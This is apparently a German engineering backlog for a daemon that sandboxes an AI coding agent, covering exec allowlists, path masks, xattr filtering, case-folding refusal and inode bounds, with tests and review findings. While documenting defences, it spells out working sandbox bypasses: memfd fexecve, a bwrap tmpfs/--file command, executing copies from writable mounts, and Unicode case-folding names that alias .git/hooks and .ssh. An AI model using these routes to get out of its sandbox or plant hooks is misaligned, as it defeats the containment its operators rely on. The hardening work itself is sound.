Test `a_failing_accept_does_not_spin_the_door`: Ein Socket, der nie lauscht,
meldet `poll` als bereit, `accept` scheitert mit `EINVAL`; in einer Sekunde
bleibt es bei rund zwanzig Versuchen (Grenze 60). Mutationsbeweis: ohne die
Pause 214 804 gescheiterte Versuche in einer Sekunde, der Test wird rot.
Kandidat aus dem Review: ein dauerhafter Fehler der Tür (etwa `EMFILE`)
bleibt still; ihn in der Zulassung vermerken wie den Vermerk der Obergrenze.

---

## HUM-479 · Kernel level: a shared cap on door connections, fairly divided

### Kontext
Aus HUM-467. Je Sitzung gilt eine Obergrenze von 64 Verbindungen; über alle
Sitzungen gibt es keine. Ein gemeinsames Limit darf keinen Gast die Türen
der anderen Sitzungen sperren lassen.

### Spezifikation
1. Ein gemeinsames Limit über alle Sitzungen mit einem garantierten Anteil
   je Sitzung, oder eine begründete Entscheidung im Spec, dass die Grenze je
   Sitzung genügt.

### Akzeptanzkriterien
1. Entscheidung mit Begründung; wenn gebaut, ein Test, dass eine volle
   Sitzung die Tür einer anderen nicht sperrt.

### Entscheidung (2026-11-18)

**Die Grenze je Sitzung genügt, solange der Daemon genau eine Sitzung
führt; ein gemeinsames Limit wird nicht gebaut.** Ein zweiter Start ist heute
`CLI_005` (`daemon/crates/ipc/src/sandbox.rs`, ADR-0024). Es gibt also nie
eine zweite Tür, deren Plätze ein gemeinsames Limit schützen oder die ein
Gast sperren könnte. Ein gemeinsames Limit über eine einzige Sitzung wäre
entweder größer als 64 und damit wirkungslos, oder kleiner und dann nur eine
niedrigere Grenze je Sitzung. Gebaut und getestet wäre ein Verteiler, den
heute kein Weg erreicht, und seine Teilung (fester Anteil je Sitzung,
geliehene Plätze, Rückgabe) hinge von Entscheidungen ab, die erst HUM-549
trifft: wie viele Sitzungen ein Daemon führen darf und wie die Anfragen ihrer
Türen dem Proxy zugeordnet werden.

**Was heute geteilt wird, und warum es reicht.** Die Tür läuft im Prozess
des Daemons; was ein Gast über sie bindet, fehlt den anderen Nutzern
desselben Prozesses (gRPC-Clients, Aufzeichnung, Proxy). Gesucht wurde
deshalb ein Betriebsmittel, das ein Gast schon mit einer Sitzung über die
Zahl gleichzeitiger Verbindungen für einen anderen Verbraucher erschöpfen
kann. Gefunden wurde keins:

- Deskriptoren: Der Daemon hebt seine Grenze nicht an (kein `setrlimit`,
  kein `LimitNOFILE` in `packaging/systemd/humanitld.service`); unter dem
  Dienstverwalter des Nutzers gilt die weiche Vorgabe von systemd, 1024. Über
  die Tür bindet ein Gast höchstens 256 Deskriptoren (64 Verbindungen zu je
  vier), dazu je Verbindung im Proxy der angenommene Socket und die
  Verbindung nach außen, zusammen etwa 384. Die Grenze des Proxys je Sitzung
  (`limits.max_client_connections`, Vorgabe 256, HUM-120) greift dahinter
  nicht einmal, weil die Tür vorher schließt. Es bleiben weit über 500
  Deskriptoren für alles andere.
- Fäden: höchstens 128 je Sitzung, ohne `TasksMax` an der Unit des Daemons;
  die Vorgabe von systemd hängt vom Rechner ab, liegt aber üblicherweise
  weit über 128 (auf diesem Rechner nicht gemessen).
- Die übrigen Wege in den Gast (Bericht, Steuerstrom, höchstens vier Shells
  über K-18) öffnet der Host selbst oder begrenzt sie fest; der Gast kann ihre
  Zahl nicht treiben.

Eine volle Tür sperrt also weder eine andere Sitzung (es gibt keine) noch
einen anderen Verbraucher im Daemon. Nicht Gegenstand dieser Entscheidung ist
der Speicher, der mit der Zahl der Anfragen über die Zeit wächst: Jede
Anfrage legt einen Eintrag in der Flow-Registry des Proxys an, die keine
Obergrenze und keine Verdrängung kennt, und Audit-Einträge laufen über einen
unbegrenzten Kanal zum Schreiber. Viele Anfragen über eine einzige
Verbindung können so den Speicher des Daemons füllen. Das ist ein eigenes
Issue (HUM-556), kein Grund für ein gemeinsames Limit der Türen.

**Wann die Frage wiederkommt.** Mit HUM-549 (mehrere Sitzungen je Daemon)
summieren sich die Grenzen: Bei N Sitzungen bindet die Tür bis zu N mal 256
Deskriptoren, und schon drei volle Türen kämen mit dem Proxy über die
weiche Grenze von 1024 (drei mal etwa 384). HUM-549 muss deshalb mit der
Zahl der Sitzungen auch das gemeinsame Budget festlegen: eine Obergrenze der Sitzungen, die Grenze der
Deskriptoren des Daemons (anheben oder ausdrücklich setzen) und, wenn ein
gemeinsames Limit der Türen nötig wird, einen garantierten Anteil je Sitzung,
den keine andere Sitzung belegen kann, mit einem Test, dass eine volle
Sitzung die Tür einer anderen nicht sperrt. Der Hinweis steht in HUM-549
(`backlog/sprint-8.md`), der Satz zum Restrisiko in K-31 von
`docs/THREAT-MODEL.md` (en und de).

---

## HUM-480 · Kernel level: enforce the programs of the unit and count them per role

### Kontext
Aus dem Review von HUM-468. Die Host-Prüfung kennt die Programme der Unit,
aber sie läuft einmal vor der Zulassung; ein Prozess, den ein übernommener
Helfer danach startet, bleibt ungesehen. Rollen sind nicht an Programme
gebunden (ein zweites `bwrap` oder `sh` statt eines Helfers besteht).

### Spezifikation
1. Die Unit erzwingt ihre Programme über den Dienstverwalter
   (`ExecPaths=` mit den kanonischen Pfaden aus `Resolved`, `NoExecPaths=/`),
   soweit die Gefängnisse von bubblewrap das zulassen; messen.
2. Die Host-Prüfung zählt je Rolle, wo es robust ist (Shell des Skripts
   genau eine, `bwrap` je Helfer).
3. `/bin/sh` als bash: prüfen, ob die Shell des Skripts ein festes Programm
   sein muss.

### Tests
- KVM: ein Helfer, der ein fremdes Programm startet, scheitert am `exec`.

### Akzeptanzkriterien
1. Kein Prozess der Unit führt ein Programm außerhalb der Liste aus, auch
   nach der Zulassung.

### Stand nach der Umsetzung (2026-11-19)
Gemessen auf Debian 14 mit systemd 262, bubblewrap 0.13.1, dash 0.5.12,
bash 5.3, QEMU 11.1.3, virtiofsd 1.14.0 und vhost-device-vsock 0.3.0, in
Units `humanitl-test-*` des Dienstverwalters des Nutzers.

**1. Erzwungen über den Dienstverwalter.** Die Unit trägt `NoExecPaths=/`
und `ExecPaths=` (`daemon/crates/sandbox/src/qemu/programs.rs`,
`exec_paths`, beim Planen jeder Sitzung). Auf der Liste stehen einzelne
Dateien, je unter ihrem aufgelösten Pfad: `/usr/bin/env` (der erste Prozess
der Unit, er leert die Umgebung; die Spezifikation nannte ihn nicht, ohne
ihn endet die Unit mit `203/EXEC`), der Shim, die Shell des Skripts,
`sleep` (das Skript wartet damit auf die Sockets der Dienste; dash und bash
haben es nicht eingebaut), bubblewrap, virtiofsd, vhost-device-vsock und
QEMU, dazu je dynamisch gebundenem Programm sein Lader und jede Bibliothek,
die `<Lader> --list <Programm>` nennt; hier 61 Dateien. Keine Verzeichnisse:
Unter `/usr/lib/x86_64-linux-gnu` liegen auf diesem Rechner 193 weitere
Programme (`find -perm -u+x ! -name '*.so*'`). Was ein Programm erst zur
Laufzeit mit `dlopen` lädt, käme nicht auf die Liste; gemessen über
`/proc/<pid>/maps` aller Prozesse einer echten Sitzung bildet keiner eine
Datei ab, die nicht darauf steht (außer `/dev/zero` und dem memfd des
Gastspeichers). Ein Programm, das kein ELF ist (etwa ein Skript als Hülle in
`sandbox.qemu.qemu`), lässt den Plan mit `SANDBOX_011` scheitern.

Gemessen:
- In der Unit endet `/usr/bin/id` mit `Permission denied` (126), auch über
  den Lader (`ld.so /usr/bin/id`: „failed to map segment").
- Die Gefängnisse erben das. Sie entstehen in einem Nutzer-Namensraum unter
  dem der Unit, wo der Kernel das geerbte `noexec` sperrt, und
  `--ro-bind /usr /usr` nimmt die Einhängungen der einzelnen Dateien
  rekursiv mit. Die Helfer starten, ein fremdes Programm im Gefängnis endet
  mit `EACCES`. bubblewrap braucht dafür nichts, was nicht auf der Liste
  steht: Es führt nur die Helfer unter `/usr` (oder unter dem eingestellten
  Pfad gebunden) aus.
- Nach der Zulassung: Eine Unterschale, die der Befehl im Gefängnis des
  Emulators vor dessen Start abzweigt und die an einer FIFO des Tests
  wartet, bekommt das Zeichen erst, wenn der Agent läuft; dann scheitert
  `/usr/bin/id` (126), und `qemu-system-x86_64 --version` startet dort. Die
  Host-Prüfung zählt die wartende Shell über
  `TestMachine::extra_shells` mit. Die erste Fassung trat mit `nsenter`
  vom Host in die Namensräume des Gefängnisses; das ging lokal, auf dem
  Runner der CI verweigerte der Kernel den Wiedereintritt in den
  Mount-Namensraum (`EPERM`), der Test wurde deshalb umgebaut und läuft
  jetzt überall gleich. Mutationsbeweis für diesen Teil: ohne
  `ExecPaths=`/`NoExecPaths=` und mit den Prüfungen vor der Zulassung
  abgeschaltet besteht die Host-Prüfung, und der Test wird erst nach der
  Zulassung rot (`id` mit Status 0). Nebenbei der Beweis, dass die
  Zählung je Rolle in der Prüfung wirkt: mit `extra_shells: 0` lehnt die
  Host-Prüfung dieselbe Sitzung ab („7 processes run the script's shell
  /bin/sh, the unit starts exactly 6", `SANDBOX_047`).
- Kosten: Unit und fünf Gefängnisse brauchen 0,19 statt 0,08 s; ein ganzer
  Start im KVM-Test 5,5 s mit und 5,6 bis 6,7 s ohne die Liste, also kein
  messbarer Unterschied.

**Nicht erreicht, ehrlich:** Das Kriterium gilt für jede Datei des Hosts,
nicht für Code, den ein übernommener Prozess selbst mitbringt.
- Eine Kopie in einem `memfd` läuft: In einer Test-Unit mit derselben Liste
  startete `fexecve` eines memfd mit einem statischen Programm. Der memfd
  liegt auf einer Einhängung des Kernels außerhalb jedes Namensraums;
  `vm.memfd_noexec` ist 0, und kein Prozess der Unit darf es heben.
- Eine Einhängung, die bubblewrap selbst in einem Gefängnis anlegt (dessen
  Wurzel, die tmpfs-Masken über `/work`, `--file`), trägt kein `noexec`:
  `bwrap --tmpfs /t --perms 0755 --file 3 /t/p /t/p` startete in der
  Test-Unit ein statisches Programm. bubblewrap kennt keine Option dafür.
Beides braucht einen Prozess, der schon Code eigener Wahl ausführt, oder
Shell und bubblewrap der Liste zusammen. QEMU verbietet sich `execve` selbst
(`-sandbox spawn=deny`), virtiofsd läuft unter seinem eigenen seccomp-Filter
(Vorgabe `kill`), vhost-device-vsock unter keinem. Vorschlag für ein eigenes
Issue, nicht angelegt.

**2. Zählen je Rolle** (`host_check::count_roles`, `Roles`). Gemessen über
die cgroup einer echten direkten Sitzung: sechs `dash` (das Skript, die
Unterschale an der Lebensleine, je Helfer eine), acht `bwrap` (je Helfer der
äußere und der Init des Gefängnisses), zwei virtiofsd, ein vsock-Gerät, ein
QEMU; eine Wegwerf-Sitzung hat sieben, zehn und drei. Die Prüfung verlangt
genau das: Shells gleich Helfer plus zwei, bubblewrap gleich zweimal die
Helfer, virtiofsd gleich die Dienste der Dateien; Emulator und vsock-Gerät
genau einer wie bisher. Eine Abweichung ist ein Fund an `single_socket`
(`SANDBOX_047`). Robust, weil das Skript fest ist und die Prüfung erst nach
dem Bericht des Gasts läuft, wenn das Warten mit `sleep` vorbei ist; alle
26 KVM-Tests, darunter Wegwerf-Sitzungen, sind damit grün.

**3. `/bin/sh` als bash.** Die Shell muss kein festes Programm sein.
`ExecPaths=` nennt das aufgelöste Ziel von `/bin/sh`, die Host-Prüfung
beide Namen. bash forkt für die Form des Skripts genauso wie dash (gemessen
mit derselben Form: fünf Unterschalen, je eine mit einem Kind), die Zahlen
aus Punkt 2 gelten also. Was bash mehr kann, erreicht kein anderes Programm:
eine ladbare Erweiterung (`enable -f`) ist eine Bibliothek und scheitert am
`noexec` wie jede andere Datei außerhalb der Liste.

Tests: `the_loader_list_names_every_library_with_a_path`,
`the_header_names_the_loader`, `a_program_brings_its_loader_and_libraries`,
`the_shell_of_the_script_comes_with_its_libraries` (programs.rs),
`the_unit_carries_the_hardening_of_the_spike` (tests.rs, `NoExecPaths=/`,
`ExecPaths=`), `every_program_runs_as_often_as_the_script_starts_it`
(host_check.rs); KVM `a_helper_that_starts_a_foreign_program_fails_at_exec`:
Ein Befehl im Gefängnis der Maschine (ein neuer Eingriff
`TestMachine::jailed_command`) und einer daneben in der Unit starten
`/usr/bin/id`, beide enden mit 126 und `Permission denied`, die Prüfung ist
grün, der Agent wird zugelassen, danach scheitert `id` in den Namensräumen
des Gefängnisses, und der Emulator startet dort. Mutationsbeweise: ohne
`NoExecPaths=/` und `ExecPaths=` läuft `id` an allen drei Stellen
(Status 0, `uid=1000 ...`), der KVM-Test wird rot; ohne den Vergleich in
`count_roles` wird der Unit-Test rot.

Aus dem Review (Codex, Sonnet als Ersatz):
- Blocking, übernommen: Eine Bibliothek, die der Lader nennt, wurde
  aufgelöst, ohne zu prüfen, dass das Ziel eine Datei ist; ein Verweis auf
  ein Verzeichnis (etwa `/usr/bin`) hätte das ganze Verzeichnis auf die
  Liste gesetzt. Jeder Eintrag (Programm, Lader, Bibliothek) muss nach dem
  Auflösen eine gewöhnliche Datei sein, sonst `SANDBOX_011`. Test mit
  Verweisen auf ein Verzeichnis in allen drei Rollen.
- Minor, übernommen, dabei gefunden: `ReadWritePaths=` hängt jeden
  beschreibbaren Pfad neu ein, und `NoExecPaths=/` erreicht diese
  Einhängung nicht. Gemessen in der KVM-Sitzung und in einer Test-Unit:
  Eine Kopie von `id` im Ordner des Tests lief aus dem Gefängnis, in der
  Test-Unit auch aus der Unit und mit `--bind` und `--ro-bind` aus einem
  Gefängnis. Jetzt steht jeder beschreibbare Pfad (Laufzeitverzeichnis,
  Projektordner, Schicht) zusätzlich in `NoExecPaths=`; er bleibt
  beschreibbar. Der KVM-Test startet jetzt auch Kopien von `id` im
  Projektordner und im Laufzeitverzeichnis (aus der Unit; dessen `root/`
  aus dem Gefängnis), alle 126. Mutationsbeweis: mit `NoExecPaths=/`
  allein läuft die Kopie im Laufzeitverzeichnis aus dem Gefängnis
  (Status 0), der Test wird rot.
- Minor, übernommen: `run_bounded` wartete nach dem Ende des Programms ohne
  Frist auf das Ende seiner Ausgabe; ein Kind, das sie offen hält, hielt
  den Aufruf fest. Jetzt lesen Fäden beide Kanäle bis zur selben Frist, das
  Programm läuft in einer eigenen Prozessgruppe, und nach der Frist bekommt
  die Gruppe `SIGKILL`. Test mit einem Lader, der ein `sleep 30` mit seiner
  Ausgabe hinterlässt; Mutationsbeweis: mit dem alten Warten dauert er
  30 s und wird rot.
- Minor, übernommen: Die Vorschau (`programs::shown_in_preview`) und die
  Ableitung der Rollen aus den geteilten Ordnern (`host_check::disposable`)
  haben eigene Unit-Tests mit Mutationsbeweis.

---

## HUM-481 · Kernel level: masks in the guest over the overlay, `--xattrmap` for the layer daemon

### Kontext
Aus HUM-446. Im Gast kann der Agent über einen maskierten Pfad in seiner
eigenen Schicht schreiben; unter bwrap verweigert das die Maske selbst.
Übernommen wird es nie (`scan_masked`), aber die Sicht des Agenten weicht ab.
Der Dienst der Schicht nimmt jedes erweiterte Attribut an.

### Spezifikation
1. Der Shim legt die Masken des Profils über das Overlay, wie bwrap sie
   über den Ordner legt.
2. `--xattrmap` lässt den Dienst der Schicht nur `user.overlay.*` und die
   nötigen Attribute annehmen.

### Tests
- KVM: ein Schreiben auf einen maskierten Pfad scheitert im Gast.

### Akzeptanzkriterien
1. Der Agent sieht im Gast dieselben Masken wie unter bwrap.

### Stand nach der Umsetzung (2026-11-19)

**Masken im Gast (Punkt 1).** Der Gastplan einer Wegwerf-Sitzung trägt die
Masken des Profils, die im Projekt vorhanden sind, als `work_masks`
(`tmpfs:<relativ>` je maskiertem Ordner, `empty:<relativ>` je maskierter
Datei, in der Reihenfolge von bwrap) und ihre Größe als `mask_mib` in
`disposable`; die erwartete Mounttabelle nennt je Maske eine Zeile
(`qemu/disposable.rs`, `guest_masks`). Eine direkte Sitzung nennt keine, dort
liegen die Masken wie bisher im Gefängnis des Dienstes für `/work`. Der Shim
(`guest_masks.rs`, aus `guest_overlay.rs` gerufen) legt nach dem Overlay auf
`/work` jede Maske darüber: ein tmpfs wie bwraps `--tmpfs` (0755, dem Nutzer
des Agenten, `nosuid`, `nodev`, 64 MiB wie auf dem Host) und für Dateien einen
nur lesbaren Bind einer leeren Datei (0600 wie bwraps `--ro-bind-data`) aus
dem tmpfs, auf dem er das Overlay vorbereitet, `nosuid`, `nodev`. Die leere
Datei der Masken einer direkten Sitzung (im Gefängnis des Dienstes für
`/work`) hat jetzt ebenfalls 0600 statt 0400. Die Kopien
der leeren Datei nimmt er mit `open_tree`, bevor die Bühne verschwindet; jedes
Ziel öffnet er mit `openat2` unter `/work` (`RESOLVE_BENEATH`,
`RESOLVE_NO_SYMLINKS`, `RESOLVE_NO_MAGICLINKS`) und hängt über diesen
Deskriptor ein, so dass keine Maske außerhalb des Overlays landet; ohne
`O_NOFOLLOW`, denn mit `O_PATH` gäbe `openat2` sonst den Deskriptor eines
Verweises am Ende selbst heraus statt `ELOOP` (vom Unit-Test gefunden). Ein
fehlendes Ziel, ein Verweis oder ein Ordner statt einer Datei und umgekehrt
verweigert den Start (`mounts_match`), wie ein gescheitertes `--tmpfs` bwraps
Start verweigert. Liegt eine Maske in einem tmpfs, das eine frühere Maske gelegt
hat (etwa `/work/custom` und dann `/work/custom/secret`), legt der Shim ihren
Einhängepunkt in diesem tmpfs an wie bwrap: fehlende Ordner 0755, eine leere
Datei 0600 mit `O_EXCL` oder einen Ordner, dem Nutzer des Agenten, jeden
Schritt mit `openat2` unter dem tmpfs ohne Verweis; nur in einem tmpfs, das
der Shim selbst gelegt hat, nie im Overlay (Befund aus dem Review von Codex).

**`--xattrmap` (Punkt 2).** Der Dienst der Schicht läuft mit
`--xattrmap ':ok:all:user.overlay.:user.overlay.::unsupported:all:::'`
(`lines::LAYER_XATTRMAP`): `user.overlay.*` geht unverändert durch, jedes
andere Attribut scheitert mit `ENOTSUP` und fehlt in Listen. `unsupported`
statt `bad` (`EPERM`), damit das Overlay unbekannte Attribute beim Kopieren
nach oben übergeht und der Gast ein Dateisystem ohne diese Attribute sieht.
Gemessen mit Linux 7.3 im Gast und virtiofsd 1.14: In der Schicht stehen
danach nur `user.overlay.opaque`, `user.overlay.impure` und
`user.overlay.uuid`. Mit `--log-level debug` beantwortete der Dienst in einem
Lauf 14 `Getxattr`, 10 `Setxattr`, 4 `Listxattr` und 3 `Removexattr`; mit der
Regel endeten 2 `Removexattr` beim Einhängen, 6 `Getxattr` und der
`Setxattr` des Agenten mit `ENOTSUP`, die übrigen mit Erfolg oder `ENODATA`.
Die Namen nennt virtiofsd nicht; vermutlich (Kernelquelltext, nicht gemessen)
sind die zwei `Removexattr` die ACLs auf dem Arbeitsverzeichnis des Overlays,
das `ENOTSUP` dort übergeht, und die `Getxattr` Fragen nach ACL und
`security.capability` beim Schreiben.
Whiteouts, opake Verzeichnisse, Kopien nach oben, `chmod` und Verweise laufen
unverändert (alle 26 KVM-Tests und `escape_worktree` gegen `qemu` grün).

**Tests und Mutationsbeweise.** KVM
`a_masked_path_and_a_foreign_xattr_are_refused_in_the_disposable_guest`
(`qemu/kvm_tests/masks.rs`): `chmod u+w` und Schreiben auf `.env` scheitern
(`EROFS`), `.env` hat die Rechte 600 und bleibt leer, ein Hook unter `.git/hooks` landet im tmpfs und
nie in der Schicht, beide Masken stehen in `/proc/self/mountinfo`,
`setxattr user.foreign` endet mit `ENOTSUP` (95), in der oberen Schicht steht
kein Attribut außer `user.overlay.*` (jeder Lesefehler lässt den Test
scheitern; das Arbeitsverzeichnis des Overlays liest er nicht, seine Ordner
haben die Rechte 0000), das opake Verzeichnis kommt durch, der Scan
sieht die Änderungen des Agenten und keine auf einer Maske. Gegatet wie die
anderen KVM-Tests, ohne Eintritt in fremde Namensräume. Mutationsbeweise:
Gastplan ohne Masken (`guest_masks(&work, &masks[..0])`) färbt den Test rot
(`chmod-rc=0`, `env-rc=0`, 7 Bytes in `.env`); der Dienst der Schicht ohne
`--xattrmap` färbt ihn rot (`xattr-foreign=ok`). Der KVM-Test legt dazu verschachtelte
Masken an (`/work/custom` und `/work/custom/inner` als tmpfs,
`/work/custom/secret` als Datei); ohne das Anlegen der Einhängepunkte startet
der Gast nicht (`SANDBOX_049`, `mask-target:custom/inner`), rot. Gemessen nebenbei: ohne Masken
scheitert ein bloßes Schreiben auf `.env` schon an den Rechten der leeren
Datei aus der unteren Schicht (`EACCES`), aber der Agent besitzt sie und
macht sie mit `chmod` beschreibbar; deshalb prüft der Test `chmod` zuerst.
Einheitstests: Lesen von `work_masks` und `mask_mib` mit jeder Abweichung
(Shim), `open_target` auf einem Verzeichnis (fehlend, Verweis am Ende, auf dem
Weg und absolut, falsche Art je Richtung; Mutationsbeweise: ohne
`RESOLVE_NO_SYMLINKS` und ohne Prüfung der Art je rot), Einträge und Tabellenzeilen je Maske (`qemu/disposable.rs`), Gastplan
mit den vorhandenen Masken nur in einer Wegwerf-Sitzung (`qemu/tests.rs`),
`--xattrmap` in der Zeile der Schicht (`qemu/lines.rs`).

**Dokumente.** `docs/SECURITY.md` Abschnitt 14 (Wegwerf-Sandbox, „What is
different") und Änderungsprotokoll, `docs/THREAT-MODEL.md` K-34 (Zeile und
Prosa) und Änderungshistorie, beides auch deutsch; die deutschen Fassungen
waren vorher schon nicht auf dem Stand ihrer Quelle, `source-sha256` bleibt.

**Offen.** Kandidat: `tmpfs`-Masken im Gast mit festem `mask_mib` belegen
Speicher des Gasts statt der Unit; ob ein eigener Abzug in
`limits::in_ram_mib` für Wegwerf-Sitzungen entfallen kann (die Masken des
Hosts sind dort nur lesbar), ist nicht geprüft.

---

## HUM-482 · Disposable layer: masks under casefold, pin the upper layer

### Kontext
Aus dem Review von HUM-446. Der Vergleich der Masken unterscheidet Groß- und
Kleinschreibung; auf einem Projektordner mit Casefold (ext4 `+F`) wäre
`.GIT/hooks` dieselbe Maske. `Layer::open_upper` hält unter Linux Gerät und
Inode der oberen Schicht nicht fest, ein vom Gast getauschtes `upper` endet
als Lesefehler statt als `SANDBOX_031`.

### Spezifikation
1. Casefold-Ordner im Wegwerf-Modus verweigern oder die Masken falten.
2. Die obere Schicht beim Anlegen mit Gerät und Inode festhalten und beim
   Lesen vergleichen.

### Akzeptanzkriterien
1. Keine Maske lässt sich über die Schreibweise umgehen; ein getauschtes
   `upper` heißt `SANDBOX_031`.

### Stand nach der Umsetzung (2026-11-15)
**Verweigern statt falten.** Falten taugt nicht: ext4 und tmpfs falten nach
Unicode mit Normalisierung, gemessen auf einem tmpfs mit `casefold` in einem
Nutzer-Namensraum (Linux 7.3): `.git/hoo\u{212a}s` (Kelvin-Zeichen) ist
`.git/hooks`, `.\u{17f}sh` (langes s) ist `.ssh`. Das ASCII-`folded` der
Klon-Masken unter macOS verfehlt das. `disposable::refuse_case_folding`
(`daemon/crates/sandbox/src/disposable/casefold.rs`) geht deshalb vor dem
Anlegen der Schicht jeden Weg zu einer Maske im geöffneten Projekt Name für
Name ab, ohne einem Symlink zu folgen, und lehnt mit `SANDBOX_030` (Rückweg
`direct`, unter `auto` also `SANDBOX_033` und ein direkter Lauf) ab, wenn die
Wurzel oder ein vorhandener Ordner auf dem Weg das Attribut Casefold trägt
(`FS_IOC_GETFLAGS`), auf vfat, exFAT, HFS+ oder SMB liegt (`statfs`), oder ein
vorhandener Name der Maske in der anderen ASCII-Schreibweise denselben Eintrag
nennt (fängt ein faltendes FUSE, solange der Eintrag existiert). Gerufen im
Start des Daemons für beide Backends und im Wegwerf-Lauf der CLI. Kein neuer
Code.

**Gastseite.** Das virtiofs im Gast kennt kein Casefold, es reicht jeden Namen
an den virtiofsd weiter, und erst dessen `openat` auf dem Host faltet; Overlay
im Gast und obere Schicht auf tmpfs unterscheiden die Schreibweise. Root im
Gast hätte also `.GIT/hooks/pre-commit` in die Schicht legen können, und die
Übernahme hätte nach `.git/hooks/pre-commit` geschrieben. Unter bwrap
verweigert overlayfs einen Casefold-Ordner selbst: Mount-Fehler „case-sensitive
directory on … is inconsistent", `EREMOTE` beim Nachschlagen in einem
gefalteten Unterordner (gesehen unter Linux 7.3). Im Modus `direct` halten
die Masken: Sie hängen auf dem Host über genau den Einträgen, und das gefaltete
Nachschlagen trifft sie (`.ENV` und `.GIT/HOOKS` leer, gemessen).

**Obere Schicht festgehalten.** `Layer::create_with` misst unter Linux Gerät
und Inode von `upper` gleich nach dem Anlegen (`upper_id`, vorher `clone_id`
nur unter macOS); `open_upper` vergleicht und meldet ein umbenanntes,
ersetztes oder fehlendes `upper` als `SANDBOX_031` („not the tree the daemon
created"). `work` wird nicht festgehalten: Der Daemon liest es nie, und das
Verwerfen folgt keinem Symlink.

**Tests.** `casefold_tests.rs`: fünf Tests mit vorgegebenem Leser des Attributs
und harten Verweisen für das Nachschlagen, dazu
`a_real_casefold_folder_is_refused`, der sich selbst unter `unshare -Urm` auf
einem tmpfs mit `casefold` aufruft (ohne Rechte, kein `mkfs`, keine
Loop-Einhängung) und überspringt, wo das nicht geht.
`a_swapped_upper_layer_is_refused` in `disposable/tests.rs`;
`a_project_that_folds_case_is_no_disposable_sandbox` in
`daemon/crates/ipc/tests/sandbox_start.rs`. Mutationsbeweise: Attribut nie
gelesen, Ordner nur an der Wurzel geprüft, Nachschlagen übergangen,
`upper_id` nicht gesetzt, Aufruf im Start entfernt; jeder färbt einen Test rot.

**Review.** Sonnet ohne blocking/major; Codex zwei Befunde, beide übernommen
(als major, billig und fail-closed). (1) Falten, das nach dem Start entsteht
(der Mensch faltet einen leeren Ordner auf dem Weg zu einer Maske oder legt
einen Namen in anderer Schreibweise an), prüfte niemand mehr:
`Waiting::refuse_case_folding` in `daemon/crates/ipc/src/disposable.rs` ruft
`refuse_case_folding_before_apply` vor dem Lesen der Schicht und unmittelbar
vor dem Schreiben einer Übernahme; der Befund ist `SANDBOX_031` (der Befund
des Übernahmewegs, nichts geschrieben, Rückweg `humanitl sandbox discard`).
Der Wegwerf-Lauf der CLI übernimmt nie und liest ohne Masken, dort keine
zweite Prüfung. Test `folding_that_appears_after_the_start_refuses_the_apply`.
(2) `same_entry` zählte jeden Fehler von `statat` als abwesend; jetzt nur
`ENOENT` und `ENOTDIR`, jeder andere Fehler verweigert. Test
`a_failed_lookup_of_the_other_case_refuses` mit eingespeistem Nachschlagen.
Mutationsbeweise: Prüfung vor der Übernahme liefert immer `Ok`, jeder Fehler
als abwesend; beide rot. Aus den Minors: klassisches HFS (`0x4244`) in der
Liste.

---

## HUM-483 · Kernel level: bound held inodes too, guard PID 1's `/proc` descriptors

### Kontext
Aus dem Review von HUM-476. Der Shim leert nur unbenutzte Einträge;
Verzeichnisse, die gecachte Kinder halten, zählen nicht, eine Kette von
Verzeichnissen kann einen Dienst weiter bis zur Grenze treiben. Kein Test
bewacht, dass die drei `/proc`-Deskriptoren von PID 1 nicht ins Kind des
Agenten gelangen.

### Spezifikation
1. Auch die Zahl der gehaltenen Inodes (`inode-state`, erstes Feld)
   beobachten und darüber leeren, messen.
2. Ein Test, der im Kind nach dem Start keinen der drei Deskriptoren
   findet.

### Akzeptanzkriterien
1. Eine Verzeichniskette erreicht die Grenze nicht unbemerkt; der Test färbt
   sich rot, wenn die keep-Liste oder das `drop` fehlt.

### Stand nach der Umsetzung (2026-11-15)
**Messung zuerst: Gewöhnliche Ketten deckt schon die Zählung der
unbenutzten.** Der Gastkernel führt einen Dentry als unbenutzt, sobald er
einmal ohne Referenz war (nach `mkdir` und jedem Nachschlagen), und zählt ihn
weiter, wenn später ein Kind ihn hält; erst ein Leeren, das ihn in Benutzung
antrifft, nimmt ihn aus der Zählung. Und ein Leeren gibt mit dem untersten
Verzeichnis die ganze Kette frei. Gemessen mit dem Shim von HUM-476
(Gastkernel der CI, 512 MiB): 80 000 Verzeichnisse als 200 Ketten von je 400,
auf dem Host angelegt und im Gast mit `find` durchlaufen, höchstens 33 286
Deskriptoren im Dienst für `/work`, kein `ENFILE`; dieselben im Gast mit
`mkdir d; cd d` je Stufe angelegt und danach durchlaufen, höchstens 33 625.
Nach dem Durchlauf von drei Ketten (1 200 Verzeichnisse) stieg das zweite Feld
von `dentry-state` um 1 201.

**Die Lücke** sind Verzeichnisse, die ein Leeren in Benutzung antraf und die
danach losgelassen wurden: Ketten, deren unterstes Verzeichnis der Agent
während eines Leerens hielt (Arbeitsverzeichnis, offener Deskriptor). Nach dem
Loslassen zählt je Kette nur das unterste Verzeichnis, der Rest bleibt von
seinen Kindern gehalten, bis 32 768 neue unbenutzte Einträge kommen. Gemessen:
105 Ketten von je 400 (42 000) gehalten, ein Walk über die Wurzel, bis PID 1
geleert hat, losgelassen: `dentry-state` 42 497 gehalten, 107 unbenutzt. Legt
der Agent danach 42 000 weitere an, bekommt er mit dem Shim von HUM-476 nach
64 924 Verzeichnissen `ENFILE`, der Dienst hält 64 948 Deskriptoren und gibt
keinen mehr frei (dreimal von drei Läufen mit 1 GiB; mit 512 MiB leerte in
einem von zwei Läufen der Gastkernel selbst unter Speicherdruck).

**Umsetzung** (`daemon/bin/humanitl-shim/src/guest_cache.rs`): PID 1 liest
zusätzlich das erste Feld von `inode-state`, die Inodes, die der Gast
insgesamt hält, und leert auch, wenn es mehr als `HELD_LIMIT` (49 152, drei
Viertel der Grenze) sind und mindestens `HELD_STEP` (8 192) mehr als direkt
nach dem letzten Leeren, spätestens aber bei `HELD_CEIL` (57 344, die Grenze
weniger einem Schritt); der Stand nach dem Leeren sinkt mit, wenn der Gast
weniger hält. Der Schritt verhindert ein Leeren alle 100 ms, wenn der Gast
viele Inodes hält, die kein Leeren freigibt (Dateien in einem tmpfs, offene
Deskriptoren, Arbeitsverzeichnisse); die Schwelle bleibt über der der
unbenutzten, damit der Arbeitsstand von `git status` gecacht bleibt. Die
Entscheidung steckt in einem reinen `Trigger` mit vier Unit-Tests. Der Bericht
trägt `CACHE bound 32768 49152`. Was der Gast in Benutzung hält, gibt auch der
neue Auslöser nicht frei; ein Gast, der absichtlich so viele Inodes eines
Dienstes hält wie dessen Grenze, bekommt `ENFILE`, `LimitNOFILE=65536` bleibt
die Garantie.

